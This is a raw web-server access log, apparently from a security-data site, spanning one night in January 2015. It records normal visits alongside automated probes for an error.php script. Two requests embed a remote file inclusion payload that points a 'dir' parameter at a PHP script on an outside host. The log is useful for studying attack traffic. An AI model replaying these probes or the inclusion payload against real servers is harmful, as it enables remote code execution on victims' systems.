176.31.252.38 - - [26/Jan/2015:18:40:56 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
222.122.56.211 - - [26/Jan/2015:18:41:10 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
222.122.56.211 - - [26/Jan/2015:18:41:11 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
50.28.14.54 - - [26/Jan/2015:18:43:09 -0800] "GET /honeypot//error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
50.28.14.54 - - [26/Jan/2015:18:43:10 -0800] "POST /honeypot//error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
50.28.14.54 - - [26/Jan/2015:18:43:11 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
50.28.14.54 - - [26/Jan/2015:18:43:13 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
87.106.187.164 - - [26/Jan/2015:18:44:31 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.7.12) Gecko/20050929" 
87.106.187.164 - - [26/Jan/2015:18:44:32 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.7.12) Gecko/20050929" 
87.106.187.164 - - [26/Jan/2015:18:49:31 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.7.12) Gecko/20050929" 
87.106.187.164 - - [26/Jan/2015:18:49:32 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.7.12) Gecko/20050929" 
96.49.48.94 - - [26/Jan/2015:19:13:20 -0800] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5" 
96.49.48.94 - - [26/Jan/2015:19:13:20 -0800] "GET / HTTP/1.1" 200 6498 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5" 
96.49.48.94 - - [26/Jan/2015:19:13:21 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5" 
96.49.48.94 - - [26/Jan/2015:19:13:23 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5" 
96.49.48.94 - - [26/Jan/2015:19:14:09 -0800] "GET /maccdc2012/tunnel.log.gz HTTP/1.1" 200 5229 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5" 
96.49.48.94 - - [26/Jan/2015:19:14:13 -0800] "GET /maccdc2012/dns.log.gz HTTP/1.1" 200 6629420 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5" 
32.177.173.75 - - [26/Jan/2015:19:48:21 -0800] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36" 
32.177.173.75 - - [26/Jan/2015:19:48:22 -0800] "GET / HTTP/1.1" 200 6498 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36" 
32.177.173.75 - - [26/Jan/2015:19:48:22 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36" 
32.177.173.75 - - [26/Jan/2015:19:48:24 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36" 
104.130.161.37 - - [26/Jan/2015:19:59:50 -0800] "GET /honeypot//error.php HTTP/1.1" 301 459 "-" "Tornado-Async-Client" 
104.130.161.37 - - [26/Jan/2015:19:59:50 -0800] "GET /honeypot//error.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.20.53 - - [26/Jan/2015:19:59:51 -0800] "GET /honeypot//error.php HTTP/1.1" 301 459 "-" "Tornado-Async-Client" 
104.130.20.53 - - [26/Jan/2015:19:59:51 -0800] "GET /honeypot//error.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.38 - - [26/Jan/2015:19:59:59 -0800] "GET //error.php HTTP/1.1" 301 441 "-" "Tornado-Async-Client" 
104.130.161.38 - - [26/Jan/2015:19:59:59 -0800] "GET /error.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.20.53 - - [26/Jan/2015:20:00:00 -0800] "GET //error.php HTTP/1.1" 301 441 "-" "Tornado-Async-Client" 
104.130.20.53 - - [26/Jan/2015:20:00:00 -0800] "GET /error.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
64.91.240.50 - - [26/Jan/2015:21:06:26 -0800] "GET /honeypot//error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
64.91.240.50 - - [26/Jan/2015:21:06:27 -0800] "GET /honeypot//error.php?dir=http://www.glory-korea.com/bbs/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
64.91.240.50 - - [26/Jan/2015:21:06:28 -0800] "POST /honeypot//error.php HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
64.91.240.50 - - [26/Jan/2015:21:06:29 -0800] "POST /honeypot//error.php HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
64.91.240.50 - - [26/Jan/2015:21:06:30 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
64.91.240.50 - - [26/Jan/2015:21:06:31 -0800] "GET //error.php?dir=http://www.glory-korea.com/bbs/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
64.91.240.50 - - [26/Jan/2015:21:06:32 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
64.91.240.50 - - [26/Jan/2015:21:06:34 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
192.99.107.64 - - [26/Jan/2015:22:47:15 -0800] "GET /robots.txt HTTP/1.1" 200 304 "-" "Mozilla/5.0 (compatible; meanpathbot/1.0; +http://www.meanpath.com/meanpathbot.html)" 
192.99.107.64 - - [26/Jan/2015:22:47:15 -0800] "GET / HTTP/1.1" 200 6442 "-" "Mozilla/5.0 (compatible; meanpathbot/1.0; +http://www.meanpath.com/meanpathbot.html)" 
66.249.64.195 - - [26/Jan/2015:23:33:06 -0800] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.64.2 - - [26/Jan/2015:23:33:06 -0800] "GET / HTTP/1.1" 200 6498 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
104.130.20.53 - - [26/Jan/2015:23:41:52 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.20.53 - - [26/Jan/2015:23:41:52 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
72.55.140.84 - - [27/Jan/2015:00:11:43 -0800] "GET / HTTP/1.1" 200 6498 "-" "Java/1.7.0_01" 
46.118.113.31 - - [27/Jan/2015:00:50:09 -0800] "POST / HTTP/1.1" 200 20822 "-" "Mozilla/5.0 (Windows NT 5.1; rv:33.0) Gecko/20100101 Firefox/33.0" 
